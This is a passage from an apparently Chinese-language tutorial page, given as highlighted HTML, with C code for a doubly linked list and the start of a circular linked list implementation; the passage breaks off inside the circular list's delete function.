class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义双向链表节点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 存储数据</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;  <span class="hljs-comment">// 指向下一个节点的指针</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *prev;  <span class="hljs-comment">// 指向前一个节点的指针</span><br>&#125; Node;<br><br><span class="hljs-comment">// 初始化双向链表</span><br><span class="hljs-function">Node* <span class="hljs-title">InitList</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 初始化为空链表</span><br>&#125;<br><br><span class="hljs-comment">// 在链表末尾插入新节点</span><br><span class="hljs-function">Node* <span class="hljs-title">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;prev = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// 如果链表为空，新节点作为头节点</span><br>    &#125;<br><br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p = p-&gt;next; <span class="hljs-comment">// 找到链表的末尾</span><br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// 将新节点插入到链表末尾</span><br>    newNode-&gt;prev = p;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 在指定节点之前插入新节点（前插法）</span><br><span class="hljs-function">Node* <span class="hljs-title">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    <span class="hljs-keyword">if</span> (head == target) &#123; <span class="hljs-comment">// 如果目标节点是头节点</span><br>        newNode-&gt;next = head;<br>        newNode-&gt;prev = <span class="hljs-literal">NULL</span>;<br>        head-&gt;prev = newNode;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// 新节点作为新的头节点</span><br>    &#125;<br><br>    Node *p = target-&gt;prev;<br>    newNode-&gt;next = target;<br>    newNode-&gt;prev = p;<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;next = newNode;<br>    &#125;<br>    target-&gt;prev = newNode;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 在指定节点之后插入新节点（后插法）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = target-&gt;next;<br>    newNode-&gt;prev = target;<br><br>    <span class="hljs-keyword">if</span> (target-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        target-&gt;next-&gt;prev = newNode;<br>    &#125;<br>    target-&gt;next = newNode;<br>&#125;<br><br><span class="hljs-comment">// 打印链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 按值删除节点</span><br><span class="hljs-function">Node* <span class="hljs-title">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; p-&gt;data != value) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head; <span class="hljs-comment">// 未找到节点</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;prev-&gt;next = p-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        head = p-&gt;next; <span class="hljs-comment">// 如果删除的是头节点</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;next-&gt;prev = p-&gt;prev;<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(p); <span class="hljs-comment">// 释放节点内存</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 按序号删除节点</span><br><span class="hljs-function">Node* <span class="hljs-title">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无效的索引\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;索引超出范围\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;prev-&gt;next = p-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        head = p-&gt;next; <span class="hljs-comment">// 如果删除的是头节点</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;next-&gt;prev = p-&gt;prev;<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(p); <span class="hljs-comment">// 释放节点内存</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 按值查找节点</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *p = head; <span class="hljs-comment">// 从头节点开始</span><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到匹配的节点</span><br>&#125;<br><br><span class="hljs-comment">// 按序号查找节点</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p; <span class="hljs-comment">// 如果索引超出范围，将返回 NULL</span><br>&#125;<br><br><span class="hljs-comment">// 求链表长度</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLength</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *head = <span class="hljs-built_in">InitList</span>(); <span class="hljs-comment">// 初始化双向链表</span><br><br>    <span class="hljs-comment">// 插入一些节点</span><br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">10</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">20</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">30</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// 打印链表内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 在值为30的节点之前插入值为25的节点</span><br>    head = <span class="hljs-built_in">InsertBefore</span>(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为30的节点之前插入值为25的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 在值为25的节点之后插入值为27的节点</span><br>    <span class="hljs-built_in">InsertAfter</span>(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为25的节点之后插入值为27的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 删除值为20的节点</span><br>    head = <span class="hljs-built_in">Delete</span>(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除值为20的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 按序号删除节点</span><br>    head = <span class="hljs-built_in">DeleteAt</span>(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除索引为2的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 按值查找节点</span><br>    Node *foundNode = <span class="hljs-built_in">FindByValue</span>(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到值为30的节点，地址为：%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到值为30的节点\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 按序号查找节点</span><br>    foundNode = <span class="hljs-built_in">FindByIndex</span>(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到索引为1的节点，值为：%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到索引为1的节点\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 求链表长度</span><br>    <span class="hljs-type">int</span> length = <span class="hljs-built_in">GetLength</span>(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表长度为：%d\n&quot;</span>, length);<br><br>    <span class="hljs-comment">// 释放链表内存</span><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义循环链表节点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 存储数据</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;  <span class="hljs-comment">// 指向下一个节点的指针</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *prev;  <span class="hljs-comment">// 指向前一个节点的指针</span><br>&#125; Node;<br><br><span class="hljs-comment">// 初始化循环链表</span><br><span class="hljs-function">Node* <span class="hljs-title">InitList</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 初始化为空链表</span><br>&#125;<br><br><span class="hljs-comment">// 在链表末尾插入新节点</span><br><span class="hljs-function">Node* <span class="hljs-title">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        newNode-&gt;next = newNode;<br>        newNode-&gt;prev = newNode;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// 如果链表为空，新节点作为头节点</span><br>    &#125;<br><br>    Node *tail = head-&gt;prev; <span class="hljs-comment">// 获取链表的尾节点</span><br>    tail-&gt;next = newNode;<br>    newNode-&gt;prev = tail;<br>    newNode-&gt;next = head;<br>    head-&gt;prev = newNode;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 在指定节点之前插入新节点（前插法）</span><br><span class="hljs-function">Node* <span class="hljs-title">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    Node *prevNode = target-&gt;prev;<br>    newNode-&gt;next = target;<br>    newNode-&gt;prev = prevNode;<br>    target-&gt;prev = newNode;<br>    prevNode-&gt;next = newNode;<br><br>    <span class="hljs-keyword">if</span> (target == head) &#123; <span class="hljs-comment">// 如果目标节点是头节点</span><br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// 新节点作为新的头节点</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 在指定节点之后插入新节点（后插法）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;目标节点为空，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// 创建新节点</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    Node *nextNode = target-&gt;next;<br>    newNode-&gt;next = nextNode;<br>    newNode-&gt;prev = target;<br>    target-&gt;next = newNode;<br>    nextNode-&gt;prev = newNode;<br>&#125;<br><br><span class="hljs-comment">// 打印链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(回到头节点)\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 按值删除节点</span><br><span class="hljs-function">Node* <span class="hljs-title">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">if</span> (p-&gt;next == p) &#123; <span class="hljs-comment">// 链表中只有一个节点</span><br>                <span class="hljs-built_in">free</span>(p);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            Node *prevNode = p-&gt;prev;<br>            Node *nextNode = p-&gt;next;<br>            prevNode-&gt;next = nextNode;<br>            nextNode-&gt;prev = prevNode;<br>            <span class="hljs-keyword">if</span> (p == head) &#123;<br>                head = nextNode; <span class="hljs-comment">// 如果删除的是头节点，更新头节点</span><br>            &#125;<br>            <span class="hljs-built_in">free</span>(p);<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br><br>   